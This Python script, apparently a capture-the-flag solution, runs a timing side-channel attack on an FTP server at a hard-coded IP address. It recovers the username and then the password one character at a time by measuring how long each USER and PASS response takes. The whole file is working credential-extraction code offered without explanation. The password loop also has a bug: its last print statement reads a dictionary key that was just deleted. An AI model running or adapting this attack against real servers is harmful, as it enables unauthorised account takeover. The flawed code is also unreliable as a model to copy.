from ftplib import FTP
import sys
import time
import signal

def signal_handler(sig, frame):
    try:
        ftp.close()
    except Exception:
        pass
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

ftp = FTP()
ftp.connect('9.223.189.135', 30019)

for _ in range(10):
    try:
        ftp.sendcmd('USER testing123')
    except:
        pass

user_start = time.time()

user = ''
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'
found = False
while not found:
    times = {}
    for c in chars:
        new_user = user + c
        start_time = time.time()
        try:
            resp = ftp.sendcmd('USER ' + new_user)
            if resp[0] == '2' or resp[0] == '3':
                user = new_user
                found = True
                print('Found user', user)
                break
        except:
            # print('err')
            pass
        end_time = time.time()
        times[c] = end_time - start_time
        # print(c, times[c])

    if not found:

        chars_sorted = sorted(times, key=lambda c: times[c])

        max_c = chars_sorted[-1]
        max_time = times[max_c]

        times.pop(max_c)
        max_time_2 = times[chars_sorted[-2]]

        
        user += max_c
        print(f'{max_c} with time delta {max_time - max_time_2:.3f}, time {max_time}')
    
print('user took ', time.time() - user_start)

password_start = time.time()
# now passy time
password = ''
# chars = 'T{}abcdefghijklmnopqrstuvwxyz'
found = False
while not found:
    times = {}
    for c in chars:
        new_password = password + c
        start_time = time.time()
        try:
            resp = ftp.sendcmd('PASS ' + new_password)
            if resp[0] == '2' or resp[0] == '3':
                password = new_password
                found = True
                print('Found password', password)
                print('pass took ', time.time() - password_start)
                break
        except:
            # print('err')
            pass
        end_time = time.time()
        times[c] = end_time - start_time
        # print(c, times[c])

    if not found:

        chars_sorted = sorted(times, key=lambda c: times[c])

        max_c = chars_sorted[-1]
        max_time = times[max_c]

        times.pop(max_c)
        max_time_2 = times[chars_sorted[-2]]

        
        password += max_c
        print(f'{max_c} with time delta {max_time - max_time_2:.3f}, time {times[max_c]}')
    